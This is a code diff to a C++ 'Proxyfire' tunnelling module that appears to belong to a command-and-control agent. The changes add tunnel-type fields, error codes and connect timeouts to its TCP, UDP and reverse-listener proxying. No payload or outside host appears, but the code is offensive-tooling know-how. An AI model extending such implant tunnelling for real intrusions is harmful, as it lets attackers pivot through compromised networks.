@@ -11,11 +11,12 @@ void Proxyfire::operator delete(void* p) noexcept
 	MemFreeLocal(&p, sizeof(Proxyfire));
 }
 
-void PackProxyStatus(Packer* packer, ULONG channelId, ULONG commandId, BOOL result)
+void PackProxyStatus(Packer* packer, ULONG channelId, ULONG commandId, ULONG type, ULONG result)
 {
 	packer->Pack32(channelId);
 	packer->Pack32(commandId);
-	packer->Pack8(result);
+	packer->Pack32(type);
+	packer->Pack32(result);
 }
 
 void PackProxyData(Packer* packer, ULONG channelId, BYTE* data, ULONG dataSize )
@@ -25,10 +26,11 @@ void PackProxyData(Packer* packer, ULONG channelId, BYTE* data, ULONG dataSize )
 	packer->PackBytes(data, dataSize);
 }
 
-void Proxyfire::AddProxyData(ULONG channelId, SOCKET sock, ULONG waitTime, ULONG mode, ULONG address, WORD port, ULONG state)
+void Proxyfire::AddProxyData(ULONG channelId, ULONG type, SOCKET sock, ULONG waitTime, ULONG mode, ULONG address, WORD port, ULONG state)
 {
 	TunnelData tunnelData = { 0 };
 	tunnelData.channelID = channelId;
+	tunnelData.type      = type;
 	tunnelData.sock      = sock;
 	tunnelData.waitTime  = waitTime;
 	tunnelData.mode      = mode;
@@ -72,7 +74,7 @@ SOCKET listenSocket(u_short port, int stream)
 	return -1;
 }
 
-void Proxyfire::ConnectMessageTCP(ULONG channelId, CHAR* address, WORD port, Packer* outPacker)
+void Proxyfire::ConnectMessageTCP(ULONG channelId, ULONG type, CHAR* address, WORD port, Packer* outPacker)
 {
 	WSAData wsaData;
 	if (ApiWin->WSAStartup(514, &wsaData)) {
@@ -88,17 +90,60 @@ void Proxyfire::ConnectMessageTCP(ULONG channelId, CHAR* address, WORD port, Pac
 				memcpy(&socketAddress.sin_addr, *(const void**)host->h_addr_list, host->h_length); 				//memmove
 				socketAddress.sin_family = AF_INET;
 				socketAddress.sin_port = _htons(port);
+
+				DWORD timeout = 100;
+				ApiWin->setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+				ApiWin->setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
+
 				u_long mode = 1;
-				if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) != -1) {
-					if (!(ApiWin->connect(sock, (sockaddr*) &socketAddress, 16) == -1 && ApiWin->WSAGetLastError() != WSAEWOULDBLOCK)) {
-						this->AddProxyData(channelId, sock, 30000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_CONNECT);
-						return;
+				ApiWin->ioctlsocket(sock, FIONBIO, &mode);
+
+				int result = ApiWin->connect(sock, (sockaddr*)&socketAddress, sizeof(socketAddress));
+				if (result == 0) {
+					this->AddProxyData(channelId, type, sock, 30000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_CONNECT);
+					ApiWin->WSACleanup();
+					return;
+				}
+
+				int connectError = ApiWin->WSAGetLastError();
+				if (connectError != WSAEWOULDBLOCK) {
+					ApiWin->closesocket(sock);
+					ApiWin->WSACleanup();
+					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, type, connectError);
+					return;
+				}
+
+				fd_set writefds;
+				FD_ZERO(&writefds);
+				FD_SET(sock, &writefds);
+				timeval tv = { 0, 100000 };
+
+				int selectResult = ApiWin->select(0, NULL, &writefds, NULL, &tv);
+
+				if (selectResult > 0 && ApiWin->__WSAFDIsSet((SOCKET)(sock), (fd_set FAR*)(&writefds))) {
+					int sockError = 0;
+					int len = sizeof(sockError);
+					ApiWin->getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&sockError, &len);
+
+					if (sockError == 0) {
+						this->AddProxyData(channelId, type, sock, 30000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_CONNECT);
 					}
+					else {
+						ApiWin->closesocket(sock);
+						PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, type, sockError);
+					}
+				}
+				else {
+					ApiWin->closesocket(sock);
+					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, type, WSAETIMEDOUT);
 				}
 			}
 		}
+
+		ULONG error = ApiWin->WSAGetLastError();
+
 		ApiWin->closesocket(sock);
-		PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, FALSE);
+		PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, type, error);
 	}
 }
 
@@ -121,14 +166,16 @@ void Proxyfire::ConnectMessageUDP(ULONG channelId, CHAR* address, WORD port, Pac
 				if (ApiWin->bind(sock, (sockaddr*)&socketAddress, sizeof(socketAddress)) < 0) {
 					u_long mode = 1;
 					if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) != -1) {
-						this->AddProxyData(channelId, sock, 30000, TUNNEL_MODE_SEND_UDP, addr, port, TUNNEL_STATE_CONNECT);
+						this->AddProxyData(channelId, 2, sock, 30000, TUNNEL_MODE_SEND_UDP, addr, port, TUNNEL_STATE_CONNECT);
 						return;
 					}
 				}
 			}
 		}
+		ULONG error = ApiWin->WSAGetLastError();
+
 		ApiWin->closesocket(sock);
-		PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, FALSE);
+		PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, 2, error);
 	}
 }
 
@@ -212,21 +259,22 @@ void Proxyfire::ConnectClose(ULONG channelId)
 void Proxyfire::ConnectMessageReverse(ULONG tunnelId, WORD port, Packer* outPacker)
 {
 	for (int i = 0; i < tunnels.size(); i++) {
-		if (this->tunnels[i].mode == TUNNEL_MODE_REVERSE_TCP && this->tunnels[i].port == port && this->tunnels[i].state != TUNNEL_STATE_CLOSE) {
-			PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, FALSE);
+		TunnelData tunnelData = this->tunnels[i];
+		if (tunnelData.mode == TUNNEL_MODE_REVERSE_TCP && tunnelData.port == port && tunnelData.state != TUNNEL_STATE_CLOSE) {
+			PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, tunnelData.type, TUNNEL_CREATE_ERROR);
 			return;
 		}
 	}
 
 	SOCKET sock = listenSocket(port, 10);
 	if (sock == -1) {
-		PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, FALSE);
+		PackProxyStatus(outPacker,tunnelId, COMMAND_TUNNEL_REVERSE, 5, TUNNEL_CREATE_ERROR);
 		return;
 	}
 	
-	this->AddProxyData(tunnelId, sock, 0, TUNNEL_MODE_REVERSE_TCP, 0, port, TUNNEL_STATE_CONNECT);
+	this->AddProxyData(tunnelId, 5, sock, 0, TUNNEL_MODE_REVERSE_TCP, 0, port, TUNNEL_STATE_CONNECT);
 
-	PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, TRUE);
+	PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, 5, TUNNEL_STATE_CONNECT);
 }
 
 ///////////////////
@@ -266,19 +314,19 @@ void Proxyfire::CheckProxy(Packer* packer)
 					packer->Pack32(COMMAND_TUNNEL_ACCEPT);
 					packer->Pack32(cid);
 
-					this->AddProxyData(cid, sock, 180000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_READY);
+					this->AddProxyData(cid, 5, sock, 180000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_READY);
 				}
 			}
 			else {
 				if (tunnelData->mode == TUNNEL_MODE_SEND_UDP) {
 					if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds)) {
 						tunnelData->state = TUNNEL_STATE_CLOSE;
-						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
+						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
 						continue;
 					}
 					if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
 						tunnelData->state = TUNNEL_STATE_READY;
-						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, TRUE);
+						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_SUCCESS);
 						continue;
 					}
 				}
@@ -286,12 +334,12 @@ void Proxyfire::CheckProxy(Packer* packer)
 					if (tunnelData->mode == TUNNEL_MODE_SEND_TCP) {
 						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds)) {
 							tunnelData->state = TUNNEL_STATE_CLOSE;
-							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
+							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
 							continue;
 						}
 						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
 							tunnelData->state = TUNNEL_STATE_READY;
-							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, TRUE);
+							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_SUCCESS);
 							continue;
 						}
 						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &readfds)) {
@@ -299,11 +347,11 @@ void Proxyfire::CheckProxy(Packer* packer)
 							tunnelData->sock = tmp_sock_2;
 							if (tmp_sock_2 == -1) {
 								tunnelData->state = TUNNEL_STATE_CLOSE;
-								PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
+								PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
 							}
 							else {
 								tunnelData->state = TUNNEL_STATE_READY;
-								PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, TRUE);
+								PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_SUCCESS);
 							}
 							ApiWin->closesocket(tunnelData->sock);
 							continue;
@@ -312,7 +360,7 @@ void Proxyfire::CheckProxy(Packer* packer)
 				}
 				if (ApiWin->GetTickCount() - tunnelData->startTick > tunnelData->waitTime) {
 					tunnelData->state = TUNNEL_STATE_CLOSE;
-					PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
+					PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
 				}
 			}
 		}
@@ -337,7 +385,7 @@ ULONG Proxyfire::RecvProxy(Packer* packer)
 				if (readed == -1) {
 					if (ApiWin->WSAGetLastError() != WSAEWOULDBLOCK) {
 						tunnelData->state = TUNNEL_STATE_CLOSE;
-						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
+						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
  				   }
 				}
 				else if (readed) {
@@ -353,7 +401,7 @@ ULONG Proxyfire::RecvProxy(Packer* packer)
 					dataLength = 0xFFFFC;
 				if (result == -1) {
 					tunnelData->state = TUNNEL_STATE_CLOSE;
-					PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
+					PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
 				}
 				else {
 					if (dataLength) {
@@ -361,7 +409,7 @@ ULONG Proxyfire::RecvProxy(Packer* packer)
 						ULONG readed = ReadFromSocket(tunnelData->sock, (PCHAR)buffer, dataLength);
 						if (readed == -1) {
 							tunnelData->state = TUNNEL_STATE_CLOSE;
-							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
+							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
 						}
 						if (readed == dataLength) {
 							PackProxyData(packer, tunnelData->channelID, (PBYTE)buffer, dataLength);
